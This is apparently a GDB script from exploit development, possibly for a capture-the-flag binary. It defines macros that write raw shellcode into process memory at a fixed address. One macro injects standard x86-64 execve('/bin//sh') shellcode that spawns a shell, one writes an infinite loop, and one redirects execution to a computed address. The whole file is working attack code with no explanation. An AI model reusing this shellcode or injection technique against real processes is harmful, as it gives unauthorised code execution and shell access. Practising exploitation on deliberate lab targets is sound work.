p $vul = 0x0000555555555706
p $win = 0x0000555555555a0e
p $a = 0x00007ffff7fbf000

define sc_shell
  p *(unsigned long long*)($a + 0x00) = 0x69622FBB4856F631
  p *(unsigned long long*)($a + 0x08) = 0x5F545368732F2F6E
  p *(unsigned long long*)($a + 0x10) = 0x0000050F3BB0EEF7
end

define sc_halt
  p *(unsigned long long*)($a + 0x00) = 0xfeebfeebfeebfeeb
  p *(unsigned long long*)($a + 0x08) = 0xfeebfeebfeebfeeb
  p *(unsigned long long*)($a + 0x10) = 0xfeebfeebfeebfeeb
end

define sc_alt
  p *(unsigned long long*)($a + 0x00) = 0xFF00001644EF8148
  p *(unsigned long long*)($a + 0x08) = 0x00000000000000D7
end